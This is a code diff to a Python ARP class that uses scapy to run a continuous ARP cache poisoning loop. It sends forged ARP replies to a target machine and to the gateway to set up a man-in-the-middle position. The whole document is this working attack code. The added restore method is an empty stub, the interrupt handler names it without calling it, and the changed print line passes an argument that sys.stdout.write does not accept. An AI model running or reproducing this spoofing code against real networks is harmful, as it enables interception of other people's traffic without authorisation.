@@ -35,28 +35,37 @@ class ARP:
             self.ARP_poisonThread = Process(target=self.ARP_poisoning_thread)
             self.ARP_poisonThread.start()
 
+
+    def restoreOriginalARPs(self):
+
+        return 1
+
     def ARP_poisoning_thread(self):
 
         packetsSent = 0
         while True:
-            packetsSent = packetsSent + 2
+            try:
+                packetsSent = packetsSent + 2
 
-            # to victim
-            packet = scapy.ARP(op=2,
-                               pdst=self.targetIP,
-                               hwdst=self.getMacAddress(self.targetIP),
-                               psrc=self.spoofWithIP)
-            scapy.send(packet, verbose=False)
+                # to victim
+                packet = scapy.ARP(op=2,
+                                   pdst=self.targetIP,
+                                   hwdst=self.getMacAddress(self.targetIP),
+                                   psrc=self.spoofWithIP)
+                scapy.send(packet, verbose=False)
 
-            # to gateway
-            packet = scapy.ARP(op=2,
-                               pdst=self.spoofWithIP,
-                               hwdst=self.getMacAddress(self.spoofWithIP),
-                               psrc=self.targetIP)
-            scapy.send(packet, verbose=False)
+                # to gateway
+                packet = scapy.ARP(op=2,
+                                   pdst=self.spoofWithIP,
+                                   hwdst=self.getMacAddress(self.spoofWithIP),
+                                   psrc=self.targetIP)
+                scapy.send(packet, verbose=False)
+
+            except KeyboardInterrupt:
+                self.restoreOriginalARPs
+                sys.exit()
 
 
-
-            sys.stdout("[+] Packets sent " + str(packetsSent), end="\r")
+            sys.stdout.write("Packets sent " + str(packetsSent), end="\r")
             sys.stdout.flush()
             time.sleep(2)
